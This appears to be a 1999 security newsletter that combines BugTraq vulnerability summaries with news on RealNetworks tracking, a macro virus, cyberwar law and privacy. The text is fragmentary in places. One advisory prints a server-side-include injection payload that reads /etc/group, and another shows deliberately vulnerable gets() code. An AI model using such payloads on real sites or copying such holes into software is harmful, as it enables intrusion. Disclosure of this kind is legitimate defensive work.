      BugTraq ID: 776
      Remote: Yes
      Date Published: 1999-11-05
      Relevant URL:
      http://www.securityfocus.com/bid/776
      Summary:
      
      When guest book is configured to allow for HTML posts and you have enabled
      server-side includes for HTML, it may be possible for an attacker to embed
      SSI (server-side include) code in guestbook messages.  The server-side
      includes allow for remote command execution, including displaying of any
      files for which the web server has read access to (see the example):
      
      
      <!--#exec cmd="cat /etc/group"
      
      In an attempt to stop this from happening, guestbook.pl parses for SSI
      commands under the assumption that they are in this format:
      
      <-- SSI command -->
                                       ^^  Does not need to be there.
      
      Apache will accept different formats, which can evade the regular
      expression in guestbook.pl, executing commands on the target host as they
      would [if they were put there by the author].

      Summary:
      
      BigIP is a load balancing system from F5 software. It has a web-based
      configuration system, which is vulnerable to several standard CGI attacks.
      According to Guy Cohen <guy@crypto.org.il>, it is possible to view
      arbitrary files on the BSDI system which it is installed on. To add to
      this, the configuration program is installed setuid root. This is
      considered a local vulnerability since htaccess authentication is required
      to get to the configuration area. No more information on this
      vulnerability is available.

      Summary:
      
      A remotely exploitable buffer overflow vulnerability was found in versions
      of Linux nfsd known to ship with Debian Linux 2.1 and RedHat Linux 5.2.
      When they were fixed in the respective distributions/versions, no
      vulnerability information was published by the vendors. The vulnerability
      was in removal of long directory paths on a mounted nfs share. The length
      of the string holding the directory name which was to be removed was not
      checked and the buffer holding it could be overflowed, allowing execution
      of arbitrary code on the nfs server as root. A consequence of this being
      exploited is remote root compromise.

      condition which they are vulnerable to.
      
      30. Immunix StackGuard Evasion Vulnerability
      BugTraq ID: 786
      Remote: Yes
      Date Published: 1999-11-08
      Relevant URL:
      http://www.securityfocus.com/bid/786
      Summary:
      The following was taken directly from the Immunix advisory:
      
      
      A significant security vulnerability has been discovered by Mariusz
      Woloszyn <emsi@it.pl> that permits attackers to perpetrate successful
      attacks against StackGuarded programs under particular circumstances.
      Woloszyn is preparing a Phrack article describing this vulnerability,
      which we summarize here.  StackGuard 1.21 effectively protects against
      this vulnerability.  The Immunix team would like to thank Mariusz for
      kindly notifying us first about this vulnerability, and allowing us the
      time to develop and distribute a defense.
      
      Consider this vulnerable code:
      
      foo(char * arg) {
          char *    p = arg;    // a vulnerable pointer
          char a[25];    // the buffer that makes the pointer vulnerable
      
          gets(a);    // using gets() makes you vulnerable
          gets(p);    // this is the good part
      }
      
      In attacking this code, the attacker first overflows the buffer a[] with
      a goal of changing the value of the char * p pointer.  Specifically,
      the attacker can cause the p pointer to point anywhere in memory,
      but especially at a return address record in an activation record.
      When the program then takes input and stores it where p points, the
      input data is stored where the attacker said to store it.
      
      The above attack is effective against the Random and Terminator Canary
      mechanisms because those methods assume that the attack is linear,
      i.e. that an attacker seeking to corrupt the return address must
      necessarily use a string operation that overflows an automatic buffer on
      the stack, moving up memory through the canary word, and only then reach
      the return address entry.  The above attack form, however, allows the
      attacker to synthesize a pointer to arbitrary space, including pointing
      directly at the return address, bypassing canary protection.

      Date Published: 1999-11-10
      Relevant URL:
      http://www.securityfocus.com/bid/788
      Summary:
      There are several vulnerabilities in recent BIND packages (pre 8.2.2).
      
      The first is a buffer overflow condition which is a result of BIND
      improperly validating NXT records. The consequence of this being exploited
      is a remote root compromise (assuming that BIND is running as root, which
      is default).
      
      The second is a denial of service which can occur if BIND does not
      validate SIG records properly.
      
      The next is a bug which allows attackers to cause BIND to consume more
      file descriptors than can be managed, causing named to crash.
      
      The fourth vulnerability is anot her denial of service which can be caused
      locally if certain permission conditions are met when validating zone
      information loaded from disk files.
      
      The last is a vulnerability has to do with closing TCP sockets.  If
      protocols for doing so are not adhered to, BIND can be paused for 120
      seconds at a time.

      The POP server that is part of the NetcPlus SmartServer3 email server has
      an unchecked buffer that could allow an attacker to execute code on the
      server. If the USER command is followed by an argument of over 800
      characters, the input buffer will be overflowed, and data from the
      argument will be passed to the system to be executed at the privelege
      level of the SmartServ program.

      The Windows Media Player ActiveX control, shipped with IE 5, returns a
      specific error code if it is instructed to load a local file that does not
      exist. In this way, an attacker could determine whether or not a specified
      file on the victim's host exists. This could be used to determine user
      names and other facets of system configuration.

18.0  First RealJukebox Now RealPlayer

      Last week it was discovered that RealNetworks software
      product RealJukebox transmitted a Global Unique
      Identifier that was used to track a users listening
      habits. Now it seems that RealPlayer, the companies
      streaming video player, also transmits a GUID.

      New Real privacy flaw 

      Over 12 million people use the software to listen to their CDs 

      A new security flaw has been discovered in one of the
      most popular programs used to access music and video
      over the internet. 

      Software experts say a privacy glitch in RealNetworks'
      RealPlayer program means it could secretly collect
      information about its millions of users. 

      Earlier this week, RealNetworks apologised after it was
      revealed that its RealJukebox software suffered from a
      similar problem. 

      It subsequently released issued a patch to remove a
      unique identification number from the software which
      tracks users' listening habits. 

      'Harder to fix'

      The US security expert who discovered the original flaw,
      Richard Smith, says the glitch is in RealPlayer could
      present a serious problem for the software company. 

      "It's harder to fix because the player has been around for
      years," Mr Smith, former president of Phar Lap Software,
      was quoted as saying. 

      RealNetworks controls around 85% of the streaming
      media market, with 69 million registered users of
      RealPlayer. 

      RealNetworks has yet to comment on the reports.But
      industry insiders say it is planning to release a new
      version of the software without the unique identification
      number. 

      Identifying users 

      The identifier is known as a globally unique identifier, or
      GUID. It transmits information to the company's
      headquarters details about what music each customer
      listens to and how many songs are copied. 

      In the case of RealNetworks, the information sent
      includes a serial number that could be used to identify
      an individual. 

      One of RealPlayer's main rivals, Microsoft's Windows
      Media Player, also transmits an identifier. 

      But the ID number cannot be linked to personal
      information as Microsoft does not require user
      registration. 

      The nonprofit group that monitors and enforces the
      corporate privacy policies of its members, TRUSTe, is
      planning to investigate whether RealNetworks had
      broken its privacy promises and whether its previous
      statement, which TRUSTe had vetted, was adequate.

      Real Damage Control -- Again 
      by Chris Oakes and Jennifer Sullivan 
      3:00 a.m. 6.Nov.1999 PST RealNetworks has issued another software update 
      that addresses a privacy concern, this time in its popular RealPlayer 
      software. 

      The company posted a free beta of RealPlayer 7 on Monday, which it said no 
      longer tracks personal user information. 

      
      Last Monday, RealNetworks had plugged a related privacy glitch in its 
      RealJukebox music software. The patch removed from its RealJukebox 
      software a unique identification number, which tracks users' listening 
      habits. Software analysis has shown that the same identifier is also 
      transmitted by version 6 of the RealPlayer. 

      The unique identification numbers could be tied to personal information 
      that is collected by RealNetworks during user registration. RealNetworks 
      claims that more than 85 million people use the RealPlayer. 

      "It's harder for [RealNetworks] to fix [the RealPlayer problem], because 
      the player has been around for years," said Richard Smith, who first 
      pointed out the problem. "[Sites] are really using the [ID] numbers in a 
      big way." Smith       pointed out that the RealPlayers currently in use 
      will continue to transmit IDs until users upgrade their software. 

      Smith regularly monitors the behavior of Internet software for security 
      and privacy flaws. 

      The identifier is known as a globally unique identifier, or GUID, and is 
      initiated during the RealPlayer registration process. The number is also 
      transmitted when users access any site providing RealAudio or RealVideo 
      streams. 

      The RealJukebox update was issued to stop the software from transmitting 
      detailed information about the user's behavior to RealNetworks servers. 

      According to the company, GUIDs can no longer be associated with any 
      personal information, such as name and email, provided during RealJukebox 
      registration. 

      The RealPlayer, however, doesn't appear to track specific user behavior as 
      RealJukebox did. It is unclear how many versions of RealPlayer have 
      transmitted the unique IDs. 

      RealNetworks' competitors include Microsoft's Windows Media Player, which 
      users have downloaded 40 million times. 

      A spokesman for Microsoft confirmed that the Windows Media Player, like 
      other players, also transmits an identifier. But since Microsoft does not 
      require user registration, the ID number cannot be tied to personal 
      information. 

      "[The transmission of unique identifiers] shows there are all these ways 
      you can leave these little digital fingerprints, and nobody has studied 
      this in a systematic way," said Paul Schwartz, law professor at Brooklyn 
      Law School and       co-author of Data Privacy Law. 

      "We have to figure out what are the privacy implications," he said. "It's
       a great illustration of how we just find these things out as we go along."

19.0  New Difficult To Kill Macro Virus Found 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNN http://www.hackernews.com/

      contributed by nvirb 
      A new macro virus known as BMH is proving difficult to
      kill say Ant-Virus vendors. BMH not only infects the
      normal template like most other Macro viruses but also
      creates and infects SNrml.dot which it places in the
      Word Startup folder. This activates the virus every time
      MS Word is launched.

      New Word 97 macro virus
      discovered 

      November 5, 1999
      Web posted at: 9:52 a.m. EST (1452 GMT)

                                        From...



      (IDG) -- A new macro-based virus
      has been discovered, and is being
      described as the virus "that will not die
      until you put a stake in its heart" by
      anti-virus vendor Aladdin Knowledge
      Systems. 

      The latest macro virus to strike is a
      Microsoft Word 97 Macro virus called W97M.BMH, or simply BMH,
      which infects the global template or normal.dot of Word 97 and will infect
      every document opened or created on the infected system. This new virus is
      unique in that it not only infects the normal template but it creates a special
      file called SNrml.dot in the \Office\STARTUP directory. 

      While macro viruses are fairly easy to create and more and more common,
      this one is different because the normal procedure for removing such viruses,
      cleaning the normal.dot file, does not work with BMH. This is because the
      virus continues to infect the system from the special SNrml.dot file,
      according to Eric Vasbinder, product marketing manager for Aladdin. 

      "It won't die, it's the undead virus,"
      Vasbinder said. "Most macro viruses tend
      to infect the normal.doc template only, but
      the BMH virus is unique in that it creates
      another .dot template and it saves it in the
      office start up directory." 

      "As a result of that, even if you remove the
      virus from the normal.dot, it will come back.
      Every file that it's in the Office start up
      directory will be executed when Word
      starts up," Vasbinder added. "It will start up
      and reinfect the system once again." 

      To remove the virus, it is necessary to
      remove both .dot files, Vasbinder said. 

      Once the virus infects a system it will also
      set the macro virus warning system within
      Office to the lowest setting, enabling future
      virus infections. It will also alter the Word application so that when users try
      to activate features, a picture will be shown instead. 

      "It prevents you from performing certain actions in Word. It will modify the
      word configuration files, so that certain menu options inside word are
      unavailable," Vasbinder said. "It will instead of activating that option, it will
      display a picture instead." 

      No information was available regarding which functions were affected or
      what the picture was of, however. 

      An Aladdin eSafe anti-virus user in the United States discovered the virus
      this week using the products "Macro Terminator" technology, which scans
      for unauthorized macro file actions, according to the company. Anti-virus
      users with heuristic scanning as part of their system will most likely already
      be protected, according to Aladdin, but users should always update their
      DAT files frequently.

20.0  Do the Laws of War Apply in Cyberspace?

      Pentagon officials are worried how the laws of war apply
      in the electronic realm. The US feels that existing laws
      are adequate to control operations in this new theater
      and that practitioners of cyber war still need to worry
      about collateral damage to civilian systems. Officials
      have also warned about over reacting to attacks on US
      systems, stating that the intent or origin must first be
      clearly established before a counter cyber attack can
      be launched. (If anyone knows where to find the report

      Military Grappling With Rules for Cyber Warfare 

      By Bradley Graham
      Washington Post Staff Writer
      Monday , November 8, 1999 ; A1 
      
      During last spring's conflict with Yugoslavia, the Pentagon considered 
      hacking into Serbian computer networks to disrupt military operations and 
      basic civilian services. But it refrained from doing so, according to 
      senior defense officials, because of continuing uncertainties and 
      limitations surrounding the emerging field of cyber warfare.

      "We went through the drill of figuring out how we would do some of these 
      cyber things if we were to do them," said a senior military officer. "But 
      we never went ahead with any."

      As computers revolutionize many aspects of life, military officials have 
      stepped up development of cyber weapons and spoken ominously of their 
      potential to change the nature of war. Instead of risking planes to bomb 
      power grids, telephone exchanges or rail       lines, for example, 
      Pentagon planners envision soldiers at computer terminals silently 
      invading foreign networks to shut down electrical facilities, interrupt 
      phone service, crash trains and disrupt financial systems. But such 
      attacks, officials say, pose nettlesome legal, ethical and practical 
      problems.

      Midway through the war with Yugoslavia, the Defense Department's top legal 
      office issued guidelines warning that misuse of cyber attacks could 
      subject U.S. authorities to war crimes charges. It advised commanders to 
      apply the same "law of war" principles to       computer attack that they 
      do to the use of bombs and missiles. These call for hitting targets that 
      are of military necessity only, minimizing collateral damage and avoiding 
      indiscriminate attacks.

      Defense officials said concern about legalities was only one of the 
      reasons U.S. authorities resisted the temptation to, say, raid the bank 
      accounts of Yugoslav President Slobodan Milosevic. Other reasons included 
      the untested or embryonic state of the U.S.       cyber arsenal and the 
      rudimentary or decentralized nature of some Yugoslav systems, which 
      officials said did not lend themselves to computer assault.

      U.S. forces did target some computers that controlled the Yugoslav air 
      defense system, the officials said. But the attacks were launched from 
      electronic jamming aircraft rather than over computer networks from 
      ground-based U.S. keyboards.

      No plan for a cyber attack on Yugoslav computer networks ever reached the 
      stage of a formal legal assessment, according to several defense officials 
      familiar with the planning. And the 50 pages of guidelines, prepared by 
      the Pentagon general counsel's office,       were not drafted with the 
      Yugoslav operation specifically in mind.

      But officials said the document, which has received little publicity, 
      reflected the collective thinking of Defense Department lawyers about 
      cyber warfare and marked the U.S. government's first formal attempt to set 
      legal boundaries for the military's involvement in       computer attack 
      operations.

      It told commanders to remain wary of targeting institutions that are 
      essentially civilian, such as banking systems, stock exchanges and 
      universities, even though cyber weapons now may provide the ability to do 
      so bloodlessly.

      In wartime, the document advised, computer attacks and other forms of what 
      the military calls "information operations" should be conducted only by 
      members of the armed forces, not civilian agents. It also stated that 
      before launching any cyber assaults,       commanders must carefully gauge 
      potential damage beyond the intended target, much as the Pentagon now 
      estimates the number of likely casualties from bomb attacks.

      While computer attacks may appear on the surface as a cleaner means of 
      destroying targets  with less prospect for physical destruction or loss 
      of life than dropping bombs  Pentagon officials say such views are 
      deceiving. By penetrating computer systems that       control the 
      communications, transportation, energy and other basic services in a 
      foreign country, cyber weapons can have serious cascading effects, 
      disrupting not only military operations but civilian life, officials say.

      Other U.S. government agencies have sided with the Pentagon view that 
      existing law and international accords are sufficient to govern 
      information warfare. But Russia is challenging this view.

      Over the past year, Moscow has tried to gather support for a United 
      Nations resolution calling for new international guidelines and the 
      banning of particularly dangerous information weapons. In comments to the 
      U.N. secretary general published last month,       Russia warned that 
      information operations "might lead to an escalation of the arms race." It 
      said "contemporary international law has virtually no means of regulating 
      the development and application of such a weapon."

      But the Russian initiative has drawn little backing. U.S. officials regard 
      it as an attempt to forestall development of an area of weaponry in which 
      Russia lags behind the United States.

      In a formal response rejecting the Russian proposal, the Clinton 
      administration said any attempt now to draft overarching principles on 
      information warfare would be premature.

      "First, you have extraordinary differences in the sophistication of 
      various countries about this type of technology," said a State Department 
      official involved in the issue. "Also, the technology changes so rapidly, 
      which complicates efforts to try to define these       things."

      Instead of turning cyber assaults into another arms control issue, the 
      administration prefers to treat them internationally as essentially a law 
      enforcement concern. U.S. officials have supported several efforts through 
      the United Nations and other groups to facilitate       international 
      cooperation in tracking computer criminals and terrorists.

      For all the heightened attention to cyber warfare, defense specialists 
      contend that there are large gaps between what the technology promises and 
      what practitioners can deliver. "We certainly have some capabilities, but 
      they aren't what I would call mature ones       yet," a high-ranking U.S. 
      military officer said.

      The full extent of the U.S. cyber arsenal is among the most tightly held 
      national security secrets. But reports point to a broad range of weapons 
      under development, including use of computer viruses or "logic bombs" to 
      disrupt enemy networks, the feeding of       false information to sow 
      confusion and the morphing of video images onto foreign television 
      stations to deceive. Last month, the Pentagon announced it was 
      consolidating plans for offensive as well as defensive cyber operations 
      under the four-star general who heads the U.S. Space Command in Colorado 
      Springs.

      But complicating large-scale computer attacks is the need for an 
      extraordinary amount of detailed intelligence about a target's hardware 
      and software systems. Commanders must know not just where to strike but be 
      able to anticipate all the repercussions of an       attack, officials 
      said.

      "A recurring theme in our discussions with military operators is, well, if 
      we can drop a bomb on it, why can't we take it out by a computer network 
      attack," said a senior Pentagon lawyer specializing in intelligence. 
      "Well, you may be able to. However, you've got       to go through a few 
      hoops and make sure that when you're choosing an alternative method, 
      you're still complying with the law of armed conflict and making sure 
      collateral damage is limited."

      In their guidelines document, titled "An Assessment of International Legal 
      Issues in Information Operations," the Pentagon's lawyers warned of such 
      unintended effects of computer attacks as opening the floodgates of a dam, 
      causing an oil refinery in a populated       area to explode in flames or 
      triggering the release of radioactivity. They also mentioned the 
      possibility of computer attacks spilling over into neutral or friendly 
      nations and noted the legal limits on deceptive actions.

      "It may seem attractive for a combatant vessel or aircraft to avoid being 
      attacked by broadcasting the agreed identification signals for a medical 
      vessel or aircraft, but such actions would be a war crime," said the 
      document, which was first reported last week by       defense analyst 
      William M. Arkin in a column on The Washington Post's online service. 
      "Similarly, it might be possible to use computer morphing techniques to 
      create an image of the enemy's chief of state informing his troops that an 
      armistice or cease-fire agreement had been signed. If false, this also 
      would be a war crime."

      The document also addressed questions about whether the United States 
      would be any more justified in using cyber weapons if a foreign adversary 
      first hacked into U.S. computer networks. The answer: It depends on the 
      extent of damage. One complicating       factor, the defense lawyers 
      wrote, is the difficulty of being certain about the real source and intent 
      of some cyber attacks, whose origin can easily be disguised.

      In the case of Yugoslavia, U.S. military authorities were slow to put 
      together a plan for conducting information operations. But one was 
      eventually assembled and approved by the middle of the 78-day war, the 
      high-ranking officer said.

      The plan involved many traditional information warfare elements  
      psychological operations, deception actions, electronic jamming of radar 
      and radio signals  targeting not just Yugoslav military and police forces 
      but Milosevic and his associates, the officer said.
      One tactic was to bombard the Yugoslav leadership with faxes and other forms of harassment.

      India sends Net regulation bill to parliament By Reuters Special to CNET

      NEW DELHI--India's federal cabinet today approved for presentation to 
      parliament a "cyber law" bill to facilitate electronic trade and commerce 
      and to prevent computer crimes.

      "The cabinet has approved the proposal to introduce the Information 
      Technology Bill 1999 in the next session of parliament to facilitate 
      electronic communication, trade, and commerce and prevent computer crime 
      in public and private [domains]," the government said in a statement. 

      The next session of parliament is expected to convene from November 29 to 
      December 23. 

      A draft of the bill was ready early this year, but it could not be taken 
      up in parliament following the collapse of the Bharatiya Janata Party-led 
      coalition government in a confidence vote last April. 

      The coalition won reelection in September-October elections. 

      The information technology bill will provide an outline for legal 
      recognition of electronic records, the statement said. 

      "The bill provides for a legal framework so that the information is not 
      denied legal effect, validity, or enforceability solely on the ground that 
      it is in form of electronic records," it said. 

      The bill draws tenets from the United Nations Commission on International 
      Trade Law's model law on e-commerce, Utah and Illinois state laws on 
      electronic and digital signatures, and the Electronic Transactions Act 
      enacted by
      Singapore in June 1998, officials said.

      Advocates call for halt to online profiling
      By Jennifer Mack, ZDNN
      November 5, 1999 4:41 PM PT
      URL: 
      
      The Federal Trade Commission and the Department of Commerce will hold a public workshop
      Monday with privacy advocates and online advertisers to discuss the use of online profiling.
      
      On Friday, privacy groups urged the FTC to immediately halt all online profiling pending an
      investigation, and speed up legislation that would protect consumer's privacy. The practice of
      creating user profiles involves gathering information on users' surfing habits, which can be used to
      deliver advertising targeted to people's specific interests.
      
      "The technology that's been developed over the past two years for profiling and collecting
      information about Web surfers has become so intrusive that these profiles are an unacceptable
      violation of consumer privacy," explained Jason Catlett, president of Junkbusters Corp., a privacy
      advocacy group. "The government needs to protect consumers from having this information
      assembled without their consent and control."
      
      Catlett and others say the industry's attempts to regulate itself when it comes to online privacy
      have been unsuccessful. He points to the industry's TRUSTe organization as an example of failed
      regulation. TRUSTe evaluates its members' privacy policies and allows cooperating Web sites to
      post a TRUSTe logo promoting their compliance.
      
      "TRUSTe doesn't do anything very useful," said Catlett. "The worst privacy violators are not going
      to pay TRUSTe to be looked at. So there's nothing to protect consumers from really bad
      violators."
      
      Online advertisers often point to users' ability to turn off information gathering "cookies" as the best
      way to stop sites from collecting personal data. Cookies are special tools used by Web sites that
      collect information about who you are and what you do when you're online. They can be
      deactivated by switching them off in your browser options. But Andrew Shen, policy analyst for
      the Electronic Privacy Information Center, believes expecting users to know how to turn off the
      cookie option is unreasonable.
      
      Unreasonable burden
      "The burden of privacy background is totally backward, said Shen. "It shouldn't be up to
      consumers to protect themselves."
      
      The privacy groups attending Monday's meeting with the FTC feel that the industry's standard
      "opt-out" policy, which requires consumers to take steps to prevent their data from being
      gathered, is unfair. They want Web users to be notified before information is collected and give
      their consent. The alternative, they feel, is the destruction of the Internet's free and open
      environment.
      
      "Everything on the Internet is going to be targeted towards you," said Shen. "You'll no longer be
      able to just browse the Net anonymously. So, in some ways, profiling really defeats what the
      Internet is all about."

      CORPUS CHRISTI -- Naval Station Ingleside
      has upgraded its web site security after a
      group seeking freedom for Kashmir reportedly
      hacked the site. 

      The security was upgraded after someone
      modified the index for the Web site and
      inserted a banner that popped up on the
      screen when a user opened the page. 

      The banner contained a political message from
      the Pakistani Hackerz Club, which said it is
      rallying for the freedom of the Kashmir region
      from Indian control. 

      By one estimate, the group has struck about
      85 civilian and military sites in several nations
      since it began its hacking spree. That includes
      Lackland Air Force Base's web site. 

      Lt. Cmdr. Kris Winter, executive officer for the
      ship maintenance activity at Ingleside, said the
      hacked site didn't contain any classified
      information, only public information about
      Shore Intermediate Maintenance Activity.
      Security for the site has been enhanced, she
      said.

      Sony glitch reveals subscriber e-mail addresses

      A software flaw allowed advertisers to view the e-mail addresses of subscribers to Sony Music
      Entertainment Corp.'s Infobeat service, the company said.
      
      The roughly 2.5 million users who subscribe to Infobeat get a daily e-mail update of music and
      entertainment news. The newsletter contains advertisements that give special URLs for interested
      consumers. 
      
      "By clicking on select advertisements, certain advertisers had the ability to obtain the e-mail
      address of the user who clicked on the link," the company said in a letter to subscribers.
      
      Sony said it had recently been informed of the error and had fixed the problem, but advised
      subscribers to set up passwords for their accounts.
      
      The company said it contacted its advertisers, who "confirmed that they did not collect or use any
      of this information."
      
      Privacy issues have become a hot topic recently. Last week, RealNetworks (Nasdaq: RNWK)
      ran into trouble after it was disclosed that the company had been tracking data about the music its
      customers downloaded.
      
      Today, the Federal Trade Commission and the Commerce Department will host a workshop to
      review whether online profiling practices invade users' privacy. Advocates last week called for the
      FTC to order a halt on online profiling pending an investigation.

      After realising that the recent privacy fiasco
      perpetrated by Real Networks was outside of its
      joursidiction the industries self appoited privacy
      guardian will rethink its charter. TrustE says that itcan
      only investigate web sites that violate privacy issues
      and not music applications that work over the internet.

      TRUSTe Declines Real Probe 
      by Chris Oakes 
      
      3:00 a.m. 9.Nov.1999 PST Privacy watchdog group TRUSTe declined Monday to 
      investigate RealNetworks, but the decision has prompted the organization 
      to expand its charter. 

      It is the second time the group has determined that a significant privacy 
      concern lies beyond the scope of its program. Although TRUSTe has 
      investigated several major violations and hundreds of minor incidents, it 
      has never revoked a       Web site's right to display its privacy seal. 

      
      TRUSTe conducted an initial inquiry last week into the behavior of 
      RealNetworks' RealJukebox software, which was surreptitiously gathering 
      data about the music-listening habits of its users and passing it on to 
      the company. The inquiry is intended to determine if a TRUSTe member 
      company may have violated privacy terms. 

      RealNetworks subsequently issued a patch to keep the software from 
      tracking the unique identifier that allowed RealNetworks to tie the 
      tracking data to users' personal information. 

      TRUSTes stated mission is to regulate the use of personal data submitted 
      to Web sites by accepting input from consumers. TRUSTe declined to 
      investigate RealNetworks because RealJukebox is music-listening software 
      that works via       the Internet, but only indirectly through a Web site 
      visit. 

      As a result, the self-monitoring group has determined that it needs to 
      expand its program to include a wider range of data collections. 

      "Unfortunately, yes, [the RealNetworks privacy problem] falls outside the 
      scope of our program," said TRUSTe spokesman Dave Steer. "Because of that, 
      we're going to be evolving the program." 

      The "trustmark" license grants companies the right to bear a seal on their 
      Web sites if they comply with TRUSTes privacy policy. The seal was 
      designed to ensure that companies disclose their data collection 
      practices. 

      The same technicality has previously led the organization to back out of 
      privacy matters that appeared on their face to be relevant to TRUSTe's 
      mission. TRUSTe cited the scope issue when it declined to investigate a 
      privacy question       related to Microsoft's Windows registration 
      process. 

      
      When people registered their Windows software, Microsoft's registration 
      program gathered a unique identifier from the user's disk. But, since the 
      process didn't explicitly involve the company's Web site, TRUSTe didn't 
      investigate. 

      Sensing a pattern of exemptions that could limit its reach -- as well as 
      consumer confidence in the TRUSTe seal -- the organization announced a 
      plan to expand its scope on Monday. 

      "The line between the data that's collected at a Web site and the data 
      that can be collected over the Internet, such as GUID [global unique 
      identification number], has been blurred," said TRUSTe's Steer. "That's 
      why we're expanding       the program." 

      Steer said TRUSTe would call on experts inside and outside the Internet 
      industry to determine how to expand the program to include the behavior of 
      software. The behavior of Internet software, such as RealNetworks', is 
      much more       complex and less apparent, he said. 

      When the program incorporates more kinds of Net-enabled behaviors, Truste 
      hopes to be in a good position to monitor the increasingly omnipresent 
      activity of data collection. 

      "In an increasingly networked society where there are 'EZ-passes' and 
      supermarket cards, this type of incident is going to become increasingly 
      common. So it's time to expand the program," Steer said. 

      TRUSTe recommended RealNetworks adopt a five-point plan that could help 
      bolster consumer trust, given the recent problems. 

      The TRUSTe news occurred on the same day that RealNetworks issued updated
      software to address a newer privacy problem affecting its streaming software
      product, RealPlayer.

      Let Them Eat Borscht
      Maybe Russians Have Been
      Hacking DoD Servers After All, but
      It's Still Our Fault 

      By Robert X. Cringely 

      Okay, so I was wrong. No, not about Y2K. As you'll
      read later on, some of the most surprising people are
      beginning to agree with my level-headed view of that
      problem. Where I was wrong was in my declaration three
      weeks ago that even if Russians were trooping through web sites at the
      Pentagon as the FBI was claiming it really didn't matter. I saw this as whining on
      the part of a group of Federal intelligence and law enforcement officials trying to
      increase their own power. And it may have been all that, but it also turns out to
      be a lot more. 

      My error was in basing that column on logic and not paying enough attention to
      human nature. The syllogism I constructed was simple: Even if programmers
      from the Russian Academy of Sciences were attacking Pentagon web sites,
      those web sites were there specifically to be attacked. The rules at the
      Department of Defense say that only non-classified information can be held on
      servers available to the public, so the DoD must simply accept the Russian
      invasion as fair use. Federal officials complaining about the loss of "sensitive
      information" had no right to complain, it seemed to me. What the Russians were
      doing was no more or less than what spider programs at Excite or Google are
      doing every day to servers all over the world. 

      My mistake, if turns out, was in not looking further into those words "sensitive
      information," and in failing to remember how we tend to compromise our own
      systems for ease of administration. 

      This column is apparently read in higher places than I ever expected. As a result,
      some significant new information has dropped into my lap. Here is what I have
      learned since that first column appeared. While computer systems with classified
      information are not supposed to be connected to the public Internet, such
      systems WERE connected. Pentagon webmasters gave themselves
      administrative access to some classified machines through unclassified machines.
      It wasn't malicious, just stupid, but the result was that the clever folks at the
      Russian Academy of Sciences (apparently they were the culprits, after all)
      gained root level access to a number of servers. Soon they were messing where
      they shouldn't have been a-messing. 

      It's not exactly clear how much information was lost, but it could have been a lot
      given the fact that the "sensitive information" referred to by the FBI was a wealth
      of login passwords for several hundred thousand individual users at the
      Department of Defense. The FBI was apparently finnessing the language since
      passwords, which are by definition secret, aren't actually considered officially
      "secret." Sheesh! 

      Once the breach was noticed, they cut the links between the secret and
      non-secret machines and told a few hundred thousand people to change their
      passwords. End of problem ... they hope. This has to be a wakeup call, though,
      to any organization that has information it wants to keep to itself. There are
      probably such administrative worm holes in most systems composed of dozens
      or hundreds of servers and the right kind of spider program will find them all. 

      Well, this is the week when Judge Thomas Penfield Jackson presents his finding
      of facts in the Microsoft anti-trust case. It hits the fan on Friday, and apparently,
      officials of Microsoft and the Department of Justice have been in almost
      continuous negotiations trying to head off the whole thing. They are trying to
      come up with a consent decree that will be, in effect, an out of court settlement
      of case. Microsoft doesn't want to be damned by the judge, and the DoJ wants
      to use this to push a restructuring at the software giant. But I have to tell you, I
      just don't buy the idea that Bill Gates is going to agree to anything that
      fundamentally hurts his company. Expect no breakthrough unless it involves
      major government concessions. 

      The reason I don't expect an out of court settlement is because the DoJ won't
      accept a cosmetic consent decree (remember this whole case came about
      because Microsoft was accused of violating the last consent decree), and
      Microsoft won't accept any agreement that has real teeth. Both sides have been
      molding their cases for months on the assumption that Judge Penfield Jackson
      will rule against Redmond on Friday. Gates already expects to be dragged
      through the mud and just hopes to see it all reversed by the more conservative

      Remember this finding of fact is not the penalty phase of the case. That's still
      months away, if ever. And Microsoft has many legal weapons it can use to stall
      real change for years. As I have long said, the day Microsoft is broken in pieces
      will be the day when Bill Gates decides several little Microsofts are worth more
      than one big Microsoft. No matter what the judge says this week, the real
      power is still in Bill's hands. 

      Finally back to Y2K. Now that Rev. Jerry Falwell has revised his alarmist and
      highly profitable views on Y2K, I think we can expect similar shifts on the part
      of other Y2K zealots. Some folks have even hinted to me that Gary North, the
      original Y2K extremist, would be shifting shortly. While I see no indication of
      that yet, I do take some comfort in knowing that Dr. North has enough
      confidence in the idea that maybe -- just maybe -- the world information
      infrastructure will remain intact enough after January 1 to allow him to continue
      offering TWO YEAR subscriptions to his newsletter. 

      If anyone is going to make money from Y2K, I want it to be my favorite Marilyn

      Computer crime outrunning law enforcement
      By David Brunnstrom, Reuters 
      November 8, 1999 8:04 AM PT
      URL: http://www.zdnet.com/zdnn/stories/news/0,4586,2389802,00.html?chkpt=zdnntop
      
      BANGKOK -- The spread of computers has made life easier for terrorists, pedophiles, drug
      dealers and financial fraudsters, making closer cooperation between police forces vital in the new
      millennium, the FBI said Monday. 
      
      "Information technology, which is a wonder for the promotion of education and good things, is
      also used by people to do harm and commit crime," Louis Freeh, the director of the Federal
      Bureau of Investigation, told a news conference. 
      
      "Whether you are a pedophile using the Internet, or a terrorist looking to shut down a stock
      exchange or the 911 emergency system...these are threats that are facilitated by globalization and
      information technology." 
      
      International cooperation
      Freeh said technology now allowed someone sitting in a far-off country to use a laptop computer
      to steal millions of dollars from a bank in New York, or to plan chemical weapon attacks. 
      
      It had progressed beyond the abilities of law enforcement to counter such threats. 
      
      "So I think the millennium will require international cooperation at unprecedented levels," he said. 
      
      "What has to happen is that high-level law enforcement officers, governments,
      presidents, prime ministers, have to ensure law enforcement issues are as
      important as matters of foreign policy, as defense issues and economic
      issues," he said. 
      
      "More and more we see the developments of technical means and
      information technologies that allow crimes and criminals to communicate
      quicker than ever. 
      
      "It means borders between our countries and jurisdictions between our police
      agencies have less and less importance. 
      
      "What we need to do is to apply the rule of law and be as competent and as
      fast moving and as coordinated as those who would break the law using the
      advantages of globalization," said Freeh. 
      
      A global battle
      Freeh was in Thailand to discuss cooperation with Prime Minister Chuan Leekpai and other
      officials and spoke at an International Law Enforcement Academy set up last year as a U.S.-Thai
      initiative. 
      
      One of two worldwide -- the other is in Budapest -- it has taught some 600 students from
      Thailand, Laos, Vietnam, Malaysia, Singapore, Indonesia, the Philippines, China and Hong Kong. 
      
      They have addressed narcotics trafficking, white-collar crime, financial investigations, trafficking of
      women and children, illegal migration and intellectual property rights. 
      
      In Thailand, Freeh discussed anti-terrorism initiatives, the threat of biological and chemical
